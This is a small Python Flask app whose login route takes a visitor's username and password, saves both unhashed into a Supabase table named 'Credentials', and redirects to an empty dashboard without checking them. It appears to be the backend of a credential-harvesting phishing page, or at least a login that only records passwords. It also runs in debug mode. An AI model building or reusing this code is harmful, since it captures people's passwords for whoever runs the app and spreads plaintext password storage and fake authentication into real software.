from flask import Flask, request, redirect, render_template
from database import supabase

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():

    username = request.form["username"]
    password = request.form["password"]

    supabase.table("Credentials").insert({
	"username": username,
	"password": password
    }).execute()

    return redirect("/dashboard")


@app.route("/dashboard")
def dashboard():

    return """
    
    """

if __name__ == "__main__":
    app.run(debug=True)